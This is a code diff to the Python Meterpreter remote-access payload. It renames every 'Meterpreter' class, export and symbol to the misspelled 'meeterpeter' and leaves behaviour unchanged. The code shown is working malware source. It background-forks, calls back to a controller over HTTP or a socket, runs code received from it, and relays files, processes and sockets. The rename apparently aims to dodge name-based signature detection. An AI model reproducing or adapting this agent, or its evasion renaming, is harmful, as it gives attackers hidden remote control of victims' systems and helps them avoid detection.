@@ -285,32 +285,32 @@ def tlv_pack(*args):
 	return data
 
 #@export
-class MeterpreterFile(object):
+class meeterpeterFile(object):
 	def __init__(self, file_obj):
 		self.file_obj = file_obj
 
 	def __getattr__(self, name):
 		return getattr(self.file_obj, name)
-export(MeterpreterFile)
+export(meeterpeterFile)
 
 #@export
-class MeterpreterSocket(object):
+class meeterpeterSocket(object):
 	def __init__(self, sock):
 		self.sock = sock
 
 	def __getattr__(self, name):
 		return getattr(self.sock, name)
-export(MeterpreterSocket)
+export(meeterpeterSocket)
 
 #@export
-class MeterpreterSocketClient(MeterpreterSocket):
+class meeterpeterSocketClient(meeterpeterSocket):
 	pass
-export(MeterpreterSocketClient)
+export(meeterpeterSocketClient)
 
 #@export
-class MeterpreterSocketServer(MeterpreterSocket):
+class meeterpeterSocketServer(meeterpeterSocket):
 	pass
-export(MeterpreterSocketServer)
+export(meeterpeterSocketServer)
 
 class STDProcessBuffer(threading.Thread):
 	def __init__(self, std, is_alive):
@@ -371,7 +371,7 @@ class STDProcess(subprocess.Popen):
 				self.stdout_reader.read(len(channel_data))
 export(STDProcess)
 
-class PythonMeterpreter(object):
+class Pythonmeeterpeter(object):
 	def __init__(self, socket=None):
 		self.socket = socket
 		self.driver = None
@@ -430,7 +430,7 @@ class PythonMeterpreter(object):
 		return func
 
 	def add_channel(self, channel):
-		assert(isinstance(channel, (subprocess.Popen, MeterpreterFile, MeterpreterSocket)))
+		assert(isinstance(channel, (subprocess.Popen, meeterpeterFile, meeterpeterSocket)))
 		idx = 0
 		while idx in self.channels:
 			idx += 1
@@ -526,7 +526,7 @@ class PythonMeterpreter(object):
 							data = channel.stdout_reader.read()
 						elif channel.poll() != None:
 							self.handle_dead_resource_channel(channel_id)
-					elif isinstance(channel, MeterpreterSocketClient):
+					elif isinstance(channel, meeterpeterSocketClient):
 						while len(select.select([channel.fileno()], [], [], 0)[0]):
 							try:
 								d = channel.recv(1)
@@ -536,11 +536,11 @@ class PythonMeterpreter(object):
 								self.handle_dead_resource_channel(channel_id)
 								break
 							data += d
-					elif isinstance(channel, MeterpreterSocketServer):
+					elif isinstance(channel, meeterpeterSocketServer):
 						if len(select.select([channel.fileno()], [], [], 0)[0]):
 							(client_sock, client_addr) = channel.accept()
 							server_addr = channel.getsockname()
-							client_channel_id = self.add_channel(MeterpreterSocketClient(client_sock))
+							client_channel_id = self.add_channel(meeterpeterSocketClient(client_sock))
 							pkt  = struct.pack('>I', PACKET_TYPE_REQUEST)
 							pkt += tlv_pack(TLV_TYPE_METHOD, 'tcp_channel_open')
 							pkt += tlv_pack(TLV_TYPE_CHANNEL_ID, client_channel_id)
@@ -617,7 +617,7 @@ class PythonMeterpreter(object):
 			return ERROR_FAILURE
 
 		self.last_registered_extension = None
-		symbols_for_extensions = {'meterpreter':self}
+		symbols_for_extensions = {'meeterpeter':self}
 		symbols_for_extensions.update(EXPORTED_SYMBOLS)
 		i = code.InteractiveInterpreter(symbols_for_extensions)
 		i.runcode(compile(data_tlv['value'], '', 'exec'))
@@ -650,9 +650,9 @@ class PythonMeterpreter(object):
 		channel = self.channels[channel_id]
 		if isinstance(channel, subprocess.Popen):
 			channel.kill()
-		elif isinstance(channel, MeterpreterFile):
+		elif isinstance(channel, meeterpeterFile):
 			channel.close()
-		elif isinstance(channel, MeterpreterSocket):
+		elif isinstance(channel, meeterpeterSocket):
 			channel.close()
 		else:
 			return ERROR_FAILURE, response
@@ -667,7 +667,7 @@ class PythonMeterpreter(object):
 			return ERROR_FAILURE, response
 		channel = self.channels[channel_id]
 		result = False
-		if isinstance(channel, MeterpreterFile):
+		if isinstance(channel, meeterpeterFile):
 			result = channel.tell() >= os.fstat(channel.fileno()).st_size
 		response += tlv_pack(TLV_TYPE_BOOL, result)
 		return ERROR_SUCCESS, response
@@ -699,9 +699,9 @@ class PythonMeterpreter(object):
 				self.handle_dead_resource_channel(channel_id)
 			if channel.stdout_reader.is_read_ready():
 				data = channel.stdout_reader.read(length)
-		elif isinstance(channel, MeterpreterFile):
+		elif isinstance(channel, meeterpeterFile):
 			data = channel.read(length)
-		elif isinstance(channel, MeterpreterSocket):
+		elif isinstance(channel, meeterpeterSocket):
 			data = channel.recv(length)
 		else:
 			return ERROR_FAILURE, response
@@ -721,9 +721,9 @@ class PythonMeterpreter(object):
 				self.handle_dead_resource_channel(channel_id)
 				return ERROR_FAILURE, response
 			channel.write(channel_data)
-		elif isinstance(channel, MeterpreterFile):
+		elif isinstance(channel, meeterpeterFile):
 			channel.write(channel_data)
-		elif isinstance(channel, MeterpreterSocket):
+		elif isinstance(channel, meeterpeterSocket):
 			try:
 				l = channel.send(channel_data)
 			except socket.error:
@@ -768,7 +768,7 @@ if not hasattr(os, 'fork') or (hasattr(os, 'fork') and os.fork() == 0):
 		except OSError:
 			pass
 	if HTTP_CONNECTION_URL and has_urllib:
-		met = PythonMeterpreter()
+		met = Pythonmeeterpeter()
 	else:
-		met = PythonMeterpreter(s)
+		met = Pythonmeeterpeter(s)
 	met.run()
